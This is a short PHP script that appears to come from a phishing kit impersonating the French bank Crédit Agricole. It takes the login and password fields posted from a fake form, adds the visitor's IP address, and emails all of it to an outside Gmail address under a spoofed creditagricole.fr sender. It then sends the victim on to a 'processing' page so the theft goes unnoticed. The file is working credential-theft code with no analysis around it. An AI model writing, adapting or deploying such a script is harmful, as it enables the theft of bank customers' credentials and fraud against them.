<?php

$ip = getenv("REMOTE_ADDR");
$browser = getenv ("HTTP_USER_AGENT");

$message .= "#============= Log ============#\n";
$message .= "Votre Identifiant : ".$_POST['identifiant']."\n";
$message .= "Votre Mot de Passe : ".$_POST['mdp']."\n";
$message .= "#============= Exit =============#\n";

$to = "sweetgolf4@gmail.com";
$subj = " axlg|".$ip."\n";
$from = "From: loog <info@creditagricole.fr>";

mail($to, $subj, $message, $from);


header("Location: processing.html");



?>   